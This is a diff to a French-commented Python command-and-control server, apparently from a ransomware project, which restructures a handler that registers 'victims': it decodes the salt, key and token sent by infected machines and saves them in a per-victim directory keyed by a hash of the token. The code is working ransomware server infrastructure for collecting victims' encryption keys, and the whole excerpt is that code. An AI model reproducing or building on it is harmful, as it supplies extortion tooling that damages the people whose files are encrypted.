@@ -30,32 +30,27 @@ class CNC(CNCBase):
                 "message": "Corps de requête vide"
             }
 
-        try:
-            # Décode la base64
-            salt = base64.b64decode(body["salt"])
-            key = base64.b64decode(body["key"])
-            token = base64.b64decode(body["token"])
 
-            # Calculez le hachage du jeton pour créer un répertoire pour la victime
-            hashed_token = sha256(token).hexdigest()
-            victim_dir = os.path.join(CNC.ROOT_PATH, hashed_token)
-            os.makedirs(victim_dir, exist_ok=True)
+        # Décode la base64
+        salt = base64.b64decode(body["salt"])
+        key = base64.b64decode(body["key"])
+        token = base64.b64decode(body["token"])
 
-            # Enregistrez le sel et la clé dans le répertoire de la victime
-            with open(os.path.join(victim_dir, "salt.bin"), "wb") as salt_file:
-                salt_file.write(salt)
-            with open(os.path.join(victim_dir, "key.bin"), "wb") as key_file:
-                key_file.write(key)
+        # Calculez le hachage du jeton pour créer un répertoire pour la victime
+        hashed_token = sha256(token).hexdigest()
+        victim_dir = os.path.join(CNC.ROOT_PATH, hashed_token)
+        os.makedirs(victim_dir, exist_ok=True)
 
-            self._log.info(f"Nouvelle victime enregistrée avec son token {hashed_token}")
-            return {"status": "Success"}
+        # Enregistrez le sel et la clé dans le répertoire de la victime
+        with open(os.path.join(victim_dir, "salt.bin"), "wb") as salt_file:
+            salt_file.write(salt)
+        with open(os.path.join(victim_dir, "key.bin"), "wb") as key_file:
+            key_file.write(key)
+
+        self._log.info(f"Nouvelle victime enregistrée avec son token {hashed_token}")
+        return {"status": "Success"}
     
-        except Exception as e:
-            self._log.error(f"Echec de l'enregistrement de la nouvelle victime: {str(e)}")
-            return {
-                "status": "Erreur",
-                "message": str(e)
-            }
+
 
 
            
